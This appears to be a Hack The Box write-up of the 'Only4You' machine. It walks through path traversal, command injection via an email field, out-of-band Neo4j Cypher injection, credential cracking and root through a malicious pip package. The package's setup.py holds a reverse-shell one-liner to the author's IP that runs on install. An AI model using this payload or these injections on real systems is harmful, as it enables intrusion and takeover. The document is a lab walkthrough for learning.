## Box Info

![255275860-51f2b41a-85ad-4fb7-9b9d-7515b8058ea3](https://github.com/0xRyies/HTB/assets/60355031/a1e3d478-b185-483c-8e70-133797856a85)


## Recon
### Nmap
nmap found two open ports 80 and 22 

![255276062-99c425a5-275a-4965-a848-0db1d0eeb080](https://github.com/0xRyies/HTB/assets/60355031/74165bac-8be8-4a69-ab61-7a56b528b954)


we can notice that it's an Ubuntu box running on Nginx 1.18.0, and we can see the domain ```only4you.htb``` so we can add that to our ```/etc/hosts``` real quick

### Viewing the web app 
nothing really interesting on the web page, almost everything is static but if we focus a bit we can catch a subdomain

![255277643-ea60d2a7-d981-4885-a891-9b739664285e](https://github.com/0xRyies/HTB/assets/60355031/44397b8e-cee2-403d-ad47-9006f157f57b)


let's add it to the ```/etc/hosts``` and see if there's anything interesting in there

![255278452-4342b2e8-9795-4e6f-adc2-f74b140caac7](https://github.com/0xRyies/HTB/assets/60355031/c263385f-ed49-4ff7-bc2a-20cc69a0a87d)


and we can actually download the source code :D, let's not waste our time and review the code.

after reviewing the code turns out there's a path traversal that allows us to read any local file we have access to as www-data

![255279037-ac6c7f04-2a10-4ab2-9ffd-f267d4fa6b73](https://github.com/0xRyies/HTB/assets/60355031/e8e39123-a9ef-482e-915b-253010178f15)


we can just bypass the filter by doing ```/etc/passwd``` and we're good to go, since we have the source code I crafted a payload to the ```/download``` endpoint to test the theory

![255280329-63302f1f-8beb-44a9-8bea-1701aadbaf8a](https://github.com/0xRyies/HTB/assets/60355031/e5824b3d-7878-4822-bb44-d5356d1c7d26)


I made a script to make my life a little easier using ```cmdline()``` 
```python
import cmd
import requests

class MyCmd(cmd.Cmd):
    prompt = 'Exp@Bash$ '

    def do_exit(self, inp):
        '''Exit the program'''
        print('Bye')
        return True

    def default(self, inp):
        try:
            # Replace the URL and the data object with your own values
            url = 'http://beta.only4you.htb/download'
            data = {"image": f"{inp}"}

            # Send the request
            response = requests.post(url, data=data)
            result = response.text
            print(result)
        except:
            print('An error occurred')

    do_EOF = do_exit

if __name__ == '__main__':
    MyCmd().cmdloop()
```
really saved me a lot of time when testing different paths. I tried enumerating procs as sometimes they can reveal the webroot but with no luck, but if you can recall we just found that the server was using nginx so let's directly access the default nginx config file

![255280932-a50c3a78-0f5a-4455-8428-ef881f50ccf3](https://github.com/0xRyies/HTB/assets/60355031/1534b703-96b8-42e6-9c93-630c5b02730c)


now we know where to look for, but we don't know the file names so we assume it's the same as the source code we viewed on ```beta.only4you.htb```

![255281346-d6d76e2a-dcbf-4d93-a6e1-5374668dfbac](https://github.com/0xRyies/HTB/assets/60355031/48b7a8fb-8a3b-4529-bbea-1e9ebbb4a14b)


viewing the app.py we can't really find anything interesting, but if you focus a bit there's an import from a file called form

![255281794-f5394620-9af2-4ecf-a693-a4a42962c794](https://github.com/0xRyies/HTB/assets/60355031/c35beceb-085c-4cc8-9693-4e0d838a240e)


in my case, I had to bruteforce it using ffuf and i got the same file 

![255282045-86d6c929-aee1-4855-89c0-730836306be7](https://github.com/0xRyies/HTB/assets/60355031/5b509ec4-fc8e-4c50-9065-1d12808cdaf2)


now we can view what's inside the ```form.py``` file
```python
import smtplib, re
from email.message import EmailMessage
from subprocess import PIPE, run
import ipaddress

def issecure(email, ip):
        if not re.match("([A-Za-z0-9]+[.-_])*[A-Za-z0-9]+@[A-Za-z0-9-]+(\.[A-Z|a-z]{2,})", email):
                return 0
        else:
                domain = email.split("@", 1)[1]
                result = run([f"dig txt {domain}"], shell=True, stdout=PIPE)
                output = result.stdout.decode('utf-8')
                if "v=spf1" not in output:
                        return 1
                else:
                        domains = []
                        ips = []
                        if "include:" in output:
                                dms = ''.join(re.findall(r"include:.*\.[A-Z|a-z]{2,}", output)).split("include:")
                                dms.pop(0)
                                for domain in dms:
                                        domains.append(domain)
                                while True:
                                        for domain in domains:
                                                result = run([f"dig txt {domain}"], shell=True, stdout=PIPE)
                                                output = result.stdout.decode('utf-8')
                                                if "include:" in output:
                                                        dms = ''.join(re.findall(r"include:.*\.[A-Z|a-z]{2,}", output)).split("include:")
                                                        domains.clear()
                                                        for domain in dms:
                                                                domains.append(domain)
                                                elif "ip4:" in output:
                                                        ipaddresses = ''.join(re.findall(r"ip4:+[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+[/]?[0-9]{2}", output)).split("ip4:")
                                                        ipaddresses.pop(0)
                                                        for i in ipaddresses:
                                                                ips.append(i)
                                                else:
                                                        pass
                                        break
                        elif "ip4" in output:
                                ipaddresses = ''.join(re.findall(r"ip4:+[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+[/]?[0-9]{2}", output)).split("ip4:")
                                ipaddresses.pop(0)
                                for i in ipaddresses:
                                        ips.append(i)
                        else:
                                return 1
                for i in ips:
                        if ip == i:
                                return 2
                        elif ipaddress.ip_address(ip) in ipaddress.ip_network(i):
                                return 2
                        else:
                                return 1

def sendmessage(email, subject, message, ip):
        status = issecure(email, ip)
        if status == 2:
                msg = EmailMessage()
                msg['From'] = f'{email}'
                msg['To'] = 'info@only4you.htb'
                msg['Subject'] = f'{subject}'
                msg['Message'] = f'{message}'

                smtp = smtplib.SMTP(host='localhost', port=25)
                smtp.send_message(msg)
                smtp.quit()
                return status
        elif status == 1:
                return status
        else:
                return status
```
the code just uses regex to check for the validity of the mail and then do a dig command on the domain part, if valid continue the process, and if not, abort with an error message.
what we are interested in is the run() function since we can control the input we can look for a command injection, we can check the regex from [here](https://regex101.com/) 

![255283548-7bd6a854-984b-4bb7-866e-1dc8a73ee8a0](https://github.com/0xRyies/HTB/assets/60355031/3038363f-fa59-4a40-9789-234a5391e5f4)


Luckily we can put ```|```, I had to try it out locally first and had this payload working

![255287708-d43f43bf-ffc5-45db-873b-b9c9dc2bf0f0](https://github.com/0xRyies/HTB/assets/60355031/d6e975c4-c34d-4720-a04a-da32a31c6bbe)

![255287534-e4a3c9ef-30eb-4717-8ae1-e035b48849fa](https://github.com/0xRyies/HTB/assets/60355031/742dcdc4-13d6-41dd-a725-91d8b53c1a4f)


having ```nc -lnvp 9001``` , we manage to get a shell as www-data 

### Shell as John


![255288058-4fe31db9-abbd-48d3-b91e-ee0422421f6e](https://github.com/0xRyies/HTB/assets/60355031/6319ff24-2499-4073-b204-8cd6b47b7a84)


when running ```netstat -tunap``` we can see some interesting ports so let's do some tunneling with chisel.

#### Quick note
if you are having this error 
```bash 
./chisel: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.32' not found (required by ./chisel)
```
you can download chisel from the source, don't compile it on your local machine, that solved the problem for me.

so after getting chisel ready on the machine we can go ahead and connect to our local machine, if you want a good source for chisel commands I suggest reading 0xdf's blog from [here](https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html) 

![255289175-5a78ba1c-f17b-4d51-9783-d0594ec9c9a9](https://github.com/0xRyies/HTB/assets/60355031/f650cacb-87fc-42fe-bfca-0b2d5ec87188)


before we run into the ports, you should configure your foxyproxy this way to use port 1080 as a proxy 

![255289954-8e8e6535-5438-4ddb-a0f0-5fb732239696](https://github.com/0xRyies/HTB/assets/60355031/936a0d68-9b29-4fce-8567-173d453531bb)


make sure to choose SOCKS5 and check the Send DNS through SOCKS box because that wasted a lot of my time ._.


#### Port 3000

![255290269-df72ba74-74c7-4ea7-8287-461a81207f3b](https://github.com/0xRyies/HTB/assets/60355031/b2efc1d2-5e66-4e51-9a15-1ded3cf4fba2)


it's a Gogs application that requires credentials and we don't have any, so we will skip it for now

#### Port 8001

![255290430-5399e0c4-8b3e-4045-a927-1e9395b7d3c5](https://github.com/0xRyies/HTB/assets/60355031/d9c2bc49-8f5c-46a9-91e9-a68a924526e5)


a simple login page, we can sign in using ```admin:admin```, that will lead us directly to the dashboard

### User Flag 

![255290687-1de3a86a-34e4-4e22-927d-06d1ce6de07d](https://github.com/0xRyies/HTB/assets/60355031/678212cb-0c53-457d-a821-38de05e9dabb)

scrolling down we notice some tasks that might give us a hint on the next step 

![255290769-f8bb6d19-c96a-4a7d-9779-41e200d5b427](https://github.com/0xRyies/HTB/assets/60355031/e2c975bd-59f2-42d3-9665-d5e5b1449afa)

it says they migrated to neo4j, interesting!

![255291142-d4df27d6-1b55-4522-b933-b2cafc80602f](https://github.com/0xRyies/HTB/assets/60355031/0d649687-d8d1-4ffa-9773-681706e0847a)


moving to the Employees section we get a cute search bar and when we try it, it looks like it's connected to the database

![255291360-05d0123b-24aa-4fb9-9b71-87790020e0f9](https://github.com/0xRyies/HTB/assets/60355031/9f4c8e95-e7aa-4187-9ed0-6d2c8466f63a)


looks like a good place to start the injection process, but what kind of injection? the tasks above said they are now using neo4j as a database so how about searching for neo4j injection?
after searching for quite some time, I found [This](https://pentester.land/blog/cypher-injection-cheatsheet/#leak-labels--properties-in-the-database) amazing blog that helped me a lot, basically the payloads are pretty much similar to SQL injections but with a little tweak.
I noticed that putting `'` gives us a 500 status code so that's a good indicator, now let's play with the curl command :D

![255292260-93325667-62cb-4de2-81ae-cb8e2af96e8c](https://github.com/0xRyies/HTB/assets/60355031/d9e14d68-6b2f-4f2e-b474-c6054fee2bf4)


I'm using proxychains since we have to connect through the socks proxy, and we are using our session cookie from the browser as we can't access the search function without an active session.

since `'` always gives a 500 error we can't view the result of our injection so it's going to be an out-of-band injection. we made a call to `db.labels()` and yielded the result back to our server using `LOAD FROM CSV`, and the result was like this 

![255293154-6675b91f-d8de-4a23-8d80-e396ed0f9d19](https://github.com/0xRyies/HTB/assets/60355031/6ac118cc-63bf-4637-ab07-2f30b0eabf53)


now we know there's a label called user, we want to know the columns, so we use `MATCH (c:user)` and yield the `keys(c)[0]` indicating the first column or property for the user label

![255293715-0c752983-708c-4c44-891f-f8f1bb0324c1](https://github.com/0xRyies/HTB/assets/60355031/48e0adc3-f11c-4e4b-8ae3-f2db5f1b2e71)


we now know that there's a username and password columns so let's just extract the values, for some reason when extracting c.username I only got one value so I made the url like this `http://10.10.16.5:9002/?l=`

![255296913-1646d3d9-c771-4db1-a6c1-55c9f4fdac14](https://github.com/0xRyies/HTB/assets/60355031/a77d823f-8ae4-42e3-8003-b3d00fc1fc68)


now we have admin and john, let's extract the password of both using `WHERE` condition 

![255297096-2e78dc5e-1576-4ee3-bb37-14c1bab71ce0](https://github.com/0xRyies/HTB/assets/60355031/5546c49a-2d0a-4c39-abd9-d48a3a122eb9)


after using [crackstation](https://crackstation.net/) we found the creds were `admin:admin` and `john:ThisIs4You`, so we can try and ssh into john since we know he is an actual user on the box

![255297329-a701631a-0061-4a61-ab90-82f069edbc5f](https://github.com/0xRyies/HTB/assets/60355031/d95e0ba9-111c-4b7c-a5ce-384bbdb0f201)

it works and now we can access user.txt

## Privilege Escalation 

![255297417-a560f124-1899-49a9-add1-809a382763f4](https://github.com/0xRyies/HTB/assets/60355031/9e1b6598-2594-44c4-8c9d-1595d89b3aa9)

trying sudo -l was very interesting as it shows we can run pip download anything that ends with tar.gz on port 3000 as root privilege so the first thing that came to my mind was that we can use john creds to access his Gogs and maybe upload a malicious package that can give us a straight root shell

### Root flag 

![255297684-25c720e7-7a1e-4860-acd5-cd310cb46893](https://github.com/0xRyies/HTB/assets/60355031/7382daae-d654-41db-a890-58166115ae97)


the creds are working and now we can make a new public repo as john and upload our shell, [This](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/pip-download-code-execution/) link helped me build the tar.gz file and it was pretty straight forward.
we can just add a small edit to the setup.py so it gives us a reverse shell instead
```python
# setup.py
from setuptools import setup, find_packages
from setuptools.command.install import install
from setuptools.command.egg_info import egg_info

def RunCommand():
	# Arbitrary code here!
	import os;os.system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.5 9191 >/tmp/f")

class RunEggInfoCommand(egg_info):
    def run(self):
        RunCommand()
        egg_info.run(self)


class RunInstallCommand(install):
    def run(self):
        RunCommand()
        install.run(self)

setup(
    name = "exploitpy",
    version = "0.0.1",
    license = "MIT",
    packages=find_packages(),
    cmdclass={
        'install' : RunInstallCommand,
        'egg_info': RunEggInfoCommand
    },
)
```

now we are ready to build the package and upload it to the repo and get the root shell

![255297997-35e7addc-2c94-4394-98de-de851ccd8b1a](https://github.com/0xRyies/HTB/assets/60355031/fee0ebb0-7339-4b3d-b0d4-abd4df86c29c)

![255298213-9f0b0fd8-e026-46ff-834f-b7a5e9297536](https://github.com/0xRyies/HTB/assets/60355031/d9d5eed7-6a39-45eb-a0fa-58419a8f7210)

![255298173-a75d1fed-eecd-44a0-98c6-de5ab7734feb](https://github.com/0xRyies/HTB/assets/60355031/291904dd-f2e8-4e6c-932f-e7d8f48d19dd)


tbh, it was a super fun machine, specially the user part, hope you enjoyed as much as I did ._. 







